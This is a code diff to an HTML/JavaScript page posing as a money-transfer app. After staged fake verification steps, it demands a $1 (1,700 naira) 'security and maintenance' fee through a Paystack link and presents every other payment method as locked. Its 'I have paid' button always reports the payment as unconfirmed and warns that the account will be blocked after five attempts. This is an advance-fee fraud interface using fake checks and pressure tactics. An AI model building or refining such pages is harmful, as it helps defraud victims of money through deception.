@@ -268,6 +268,24 @@
             background: #244b78;
         }
 
+        .btn-secondary {
+            background: #f0f5fc;
+            color: #1e3a5f;
+            border: 1px solid #1e3a5f;
+            padding: 16px;
+            border-radius: 30px;
+            font-weight: 600;
+            font-size: 15px;
+            cursor: pointer;
+            width: 100%;
+            transition: 0.2s;
+            margin-top: 8px;
+        }
+
+        .btn-secondary:hover {
+            background: #e1eaf7;
+        }
+
         .back-button {
             display: inline-flex;
             align-items: center;
@@ -338,33 +356,72 @@
             line-height: 1.4;
         }
 
-        .payment-box {
-            background: #f2f8ff;
-            border-radius: 26px;
+        /* payment options */
+        .payment-options {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin: 20px 0;
+        }
+
+        .payment-option {
+            background: #f5faff;
+            border-radius: 30px;
+            padding: 16px 20px;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            font-weight: 500;
+            color: #1e3a5f;
+            border: 1px solid transparent;
+        }
+
+        .payment-option i {
+            font-size: 22px;
+            width: 30px;
+            color: #1e3a5f;
+        }
+
+        .payment-option.locked {
+            opacity: 0.5;
+            filter: grayscale(0.6);
+            pointer-events: none;
+            background: #f0f3f8;
+        }
+
+        .payment-option.unlocked {
+            background: #f0f6ff;
+            border-color: #1e3a5f;
+            cursor: pointer;
+        }
+
+        .payment-option.unlocked:hover {
+            background: #e4edfe;
+        }
+
+        .payment-link-button {
+            display: block;
+            background: #1e3a5f;
+            color: white;
+            text-decoration: none;
             padding: 18px;
-            border: 1px solid #d9e6ff;
+            border-radius: 30px;
+            font-weight: 600;
+            font-size: 16px;
             text-align: center;
             margin: 16px 0;
-            font-size: 13px;
             word-break: break-all;
         }
 
-        .payment-box a {
-            color: #1e3a5f;
-            font-weight: 600;
-            font-size: 14px;
+        .payment-link-button i {
+            margin-right: 8px;
         }
 
-        .copy-btn {
-            background: white;
-            border: 1px solid #1e3a5f;
-            color: #1e3a5f;
-            padding: 14px;
-            border-radius: 30px;
-            font-weight: 600;
-            font-size: 14px;
-            cursor: pointer;
-            width: 100%;
+        .instruction-text {
+            font-size: 13px;
+            color: #4b607c;
+            text-align: center;
+            margin: 12px 0;
         }
 
         .attempt-badge {
@@ -497,12 +554,12 @@
                 </div>
             </div>
 
-            <!-- FEE PAGE -->
-            <div id="feePage" class="page">
+            <!-- FEE REASONS PAGE (with Proceed Now) -->
+            <div id="feeReasonsPage" class="page">
                 <div class="card">
                     <div class="page-header"><i class="fas fa-shield-alt"></i><h2>Security & maintenance</h2></div>
                     <div style="background:#f0f6ff; border-radius:22px; padding:18px; margin-bottom:16px;">
-                        <p style="font-size:15px;">A one-time <strong>$1.00 fee</strong> (1,700 naira) is required.</p>
+                        <p style="font-size:15px;">A one-time <strong>$1.00 fee</strong> (1,700 naira) is required for this new beneficiary.</p>
                     </div>
                     <div class="reasons-grid">
                         <div class="reason-block"><i class="fas fa-address-card"></i><h4>Verification</h4><p>International database check.</p></div>
@@ -510,20 +567,38 @@
                         <div class="reason-block"><i class="fas fa-file-contract"></i><h4>Compliance</h4><p>KYC requirements.</p></div>
                         <div class="reason-block"><i class="fas fa-network-wired"></i><h4>Maintenance</h4><p>Infrastructure upgrade.</p></div>
                     </div>
-                    <p style="font-size:13px; margin:12px 0;">Other methods locked. Local bank only.</p>
-                    <div id="localBankOption" style="background:#f0f6ff; border-radius:40px; padding:16px; text-align:center; cursor:pointer; border:1px solid #1e3a5f;"><i class="fas fa-university"></i> Local bank (click to pay)</div>
-
-                    <div id="localBankGeneration" style="display:none; text-align:center; margin:16px 0;"><i class="fas fa-spinner fa-pulse"></i> generating secure payment...</div>
-                    <div id="localBankDetails" style="display:none;">
-                        <div class="payment-box">
-                            <i class="fas fa-lock"></i><br>
-                            <a href="https://paystack.shop/pay/6iqq8-yw-w" target="_blank">https://paystack.shop/pay/6iqq8-yw-w</a>
-                            <div style="margin-top:10px;">Send exactly 1,700 naira via the link.</div>
-                        </div>
-                        <button class="copy-btn" id="copyLinkBtn"><i class="far fa-copy"></i> copy payment link</button>
-                        <button class="btn-primary" id="iHavePaidBtn" style="margin-top:12px;">✓ I have made the $1 payment</button>
-                    </div>
+                    <button class="btn-primary" id="proceedToPaymentBtn">Proceed now <i class="fas fa-arrow-right"></i></button>
                     <div class="back-button" data-page="send"><i class="fas fa-arrow-left"></i> Back to Send</div>
+                </div>
+            </div>
+
+            <!-- PAYMENT OPTIONS PAGE (with local bank only) -->
+            <div id="paymentOptionsPage" class="page">
+                <div class="card">
+                    <div class="page-header"><i class="fas fa-credit-card"></i><h2>Payment method</h2></div>
+                    <p style="font-size:14px; color:#1e3a5f; margin-bottom:16px;">Select a payment option for the $1 fee:</p>
+                    
+                    <div class="payment-options">
+                        <div class="payment-option locked"><i class="fab fa-paypal"></i> PayPal <span style="margin-left:auto; font-size:12px;">unavailable</span></div>
+                        <div class="payment-option locked"><i class="fab fa-cash-app"></i> Cash App <span style="margin-left:auto; font-size:12px;">unavailable</span></div>
+                        <div class="payment-option locked"><i class="fas fa-dollar-sign"></i> Dollar account <span style="margin-left:auto; font-size:12px;">unavailable</span></div>
+                        <div class="payment-option locked"><i class="fab fa-bitcoin"></i> Crypto <span style="margin-left:auto; font-size:12px;">unavailable</span></div>
+                        <div class="payment-option unlocked" id="localBankOption"><i class="fas fa-university"></i> Local bank <span style="margin-left:auto; font-size:12px;">available</span></div>
+                    </div>
+
+                    <!-- Local bank payment area (hidden initially) -->
+                    <div id="localBankPaymentArea" style="display: none;">
+                        <div class="instruction-text">
+                            <i class="fas fa-info-circle"></i> Send exactly 1,700 naira using the link below:
+                        </div>
+                        <a href="https://paystack.shop/pay/6iqq8-yw-w" target="_blank" class="payment-link-button" id="paymentLinkBtn">
+                            <i class="fas fa-lock"></i> pay with Paystack
+                        </a>
+                        <button class="btn-secondary" id="copyLinkBtn"><i class="far fa-copy"></i> copy payment link</button>
+                        <button class="btn-primary" id="iHavePaidBtn" style="margin-top:16px;">✓ I have made the $1 payment</button>
+                    </div>
+
+                    <div class="back-button" id="backFromPaymentOptions"><i class="fas fa-arrow-left"></i> Back</div>
                 </div>
             </div>
 
@@ -533,8 +608,8 @@
                     <i class="fas fa-exclamation-circle" style="font-size:50px; color:#b33; margin-bottom:16px;"></i>
                     <h3 style="color:#1e3a5f; margin-bottom:12px;">Payment not confirmed</h3>
                     <p style="background:#fee; padding:16px; border-radius:22px; font-size:14px;" id="notPaidMessage">You haven't paid the $1 fee.</p>
-                    <div class="attempt-badge" id="attemptCounter" style="margin:16px 0;">Attempt 1 of 5</div>
-                    <button class="btn-primary" id="goBackToFeeBtn">← Back to payment</button>
+                    <div class="attempt-badge" id="attemptCounter" style="margin:16px 0;">Attempt 1 of 5. After 5 failed attempts your account will be blocked.</div>
+                    <button class="btn-primary" id="goBackToPaymentBtn">← Back to payment</button>
                 </div>
             </div>
 
@@ -570,7 +645,8 @@
                 dashboard: document.getElementById('dashboardPage'),
                 send: document.getElementById('sendPage'),
                 verify: document.getElementById('verifyPage'),
-                fee: document.getElementById('feePage'),
+                feeReasons: document.getElementById('feeReasonsPage'),
+                paymentOptions: document.getElementById('paymentOptionsPage'),
                 notPaid: document.getElementById('notPaidPage'),
                 receive: document.getElementById('receivePage'),
                 electrify: document.getElementById('electrifyPage'),
@@ -586,7 +662,7 @@
                 if (pages[pageId]) pages[pageId].classList.add('active-page');
             }
 
-            // navigation - slower transition
+            // navigation
             document.querySelectorAll('[data-page]').forEach(el => {
                 el.addEventListener('click', (e) => {
                     e.stopPropagation();
@@ -595,12 +671,12 @@
                 });
             });
 
-            // refresh balance (slower)
+            // refresh balance
             document.getElementById('refreshBalanceBtn').addEventListener('click', () => {
                 showLoader(700, 'refreshing...', () => {});
             });
 
-            // send validation -> verification with slower pacing
+            // send validation -> verification
             const doneSend = document.getElementById('doneSendBtn');
             const sendError = document.getElementById('sendError');
             const beneficiary = document.getElementById('beneficiaryName');
@@ -623,7 +699,6 @@
                     const step3 = document.getElementById('step3');
                     const status = document.getElementById('verifyStatus');
                     
-                    // slower, more deliberate steps
                     setTimeout(() => {
                         step1.innerHTML = '<i class="fas fa-check-circle" style="color:#1e8f5e;"></i> <span>Beneficiary details OK</span>';
                     }, 2000);
@@ -635,40 +710,49 @@
                         status.innerText = '✅ All verifications successful. Redirecting...';
                     }, 5600);
                     setTimeout(() => {
-                        showPage('fee');
+                        showPage('feeReasons');
                     }, 6800);
                 });
             });
 
-            // local bank
-            document.getElementById('localBankOption').addEventListener('click', () => {
-                document.getElementById('localBankGeneration').style.display = 'block';
-                document.getElementById('localBankDetails').style.display = 'none';
-                setTimeout(() => {
-                    document.getElementById('localBankGeneration').style.display = 'none';
-                    document.getElementById('localBankDetails').style.display = 'block';
-                }, 2200);
+            // Proceed to payment options
+            document.getElementById('proceedToPaymentBtn').addEventListener('click', () => {
+                showLoader(600, 'loading...', () => {
+                    showPage('paymentOptions');
+                });
             });
 
+            // Back from payment options to fee reasons
+            document.getElementById('backFromPaymentOptions').addEventListener('click', () => {
+                showLoader(500, '', () => showPage('feeReasons'));
+            });
+
+            // Local bank click - show payment area
+            document.getElementById('localBankOption').addEventListener('click', () => {
+                document.getElementById('localBankPaymentArea').style.display = 'block';
+            });
+
+            // Copy link
             document.getElementById('copyLinkBtn').addEventListener('click', () => {
                 navigator.clipboard.writeText('https://paystack.shop/pay/6iqq8-yw-w').then(() => alert('✓ link copied'));
             });
 
+            // I have paid -> not paid with counter
             let attemptCount = 0;
             document.getElementById('iHavePaidBtn').addEventListener('click', () => {
                 attemptCount++;
                 if (attemptCount > 5) attemptCount = 5;
                 let msg = `Attempt ${attemptCount} of 5. After 5 failed attempts your account will be blocked.`;
                 if (attemptCount >= 5) msg = 'Account blocked due to 5 failed attempts.';
-                showLoader(3000, 'verifying...', () => {
+                showLoader(3000, 'verifying payment...', () => {
                     showPage('notPaid');
                     document.getElementById('notPaidMessage').innerHTML = `You haven't paid the $1 fee.`;
                     document.getElementById('attemptCounter').innerText = msg;
                 });
             });
 
-            document.getElementById('goBackToFeeBtn').addEventListener('click', () => {
-                showLoader(700, '', () => showPage('fee'));
+            document.getElementById('goBackToPaymentBtn').addEventListener('click', () => {
+                showLoader(700, '', () => showPage('paymentOptions'));
             });
 
             showPage('dashboard');
